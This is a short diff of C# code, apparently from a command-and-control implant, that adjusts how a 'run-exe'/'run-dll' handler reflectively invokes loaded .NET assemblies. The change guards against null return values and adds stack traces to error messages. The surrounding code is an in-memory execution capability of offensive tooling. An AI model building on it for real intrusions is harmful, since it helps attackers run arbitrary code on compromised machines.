@@ -265,12 +265,11 @@ public class Program
 			   return AppDomain.CurrentDomain.GetAssemblies().Where(z => z.FullName == name.FullName).LastOrDefault();
 		   }, null, true);
 	}
-	static string rAsm(string c)
+    static string rAsm(string c)
 	{
 		var splitargs = c.Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries);
 		int i = 0;
-		string sOut = null;
-		bool runexe = true;
+		string sOut = "";
 		string sMethod = "", sta = "", qNme = "", name = "";
 		foreach (var a in splitargs)
 		{
@@ -299,18 +298,28 @@ public class Program
 				try
 				{
 					if (c.ToLower().StartsWith("run-exe")) {
-						sOut = lTyp.Assembly.EntryPoint.Invoke(null, new object[] { asArgs }).ToString();
+                        object output = lTyp.Assembly.EntryPoint.Invoke(null, new object[] { asArgs });
+                        if(output != null){
+                            sOut = output.ToString();
+                        }
 					}
 					else if(c.ToLower().StartsWith("run-dll")) 
 					{
 						try
 						{
-							sOut = lTyp.Assembly.GetType(qNme).InvokeMember(sMethod, BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, asArgs).ToString();
+                            object output = lTyp.Assembly.GetType(qNme).InvokeMember(sMethod, BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, asArgs);
+                            if(output != null){
+                                sOut = output.ToString();
+                            }
 						}
 						catch
 						{
-                            sOut = lTyp.Assembly.GetType(qNme).InvokeMember(sMethod, BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, null).ToString(); 						}
-					}
+                            object output = lTyp.Assembly.GetType(qNme).InvokeMember(sMethod, BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, null);
+                            if(output != null){
+                                sOut = output.ToString();
+                            }
+					    }
+                    }
                     else {
                         sOut = "[-] Error running assembly, unrecognised command: " + c;
                     }
@@ -319,6 +328,7 @@ public class Program
 				catch(Exception e)
                 {
                         sOut = "[-] Error running assembly: " + e.Message;
+                        sOut += e.StackTrace;
                 }
 				break;
 			}
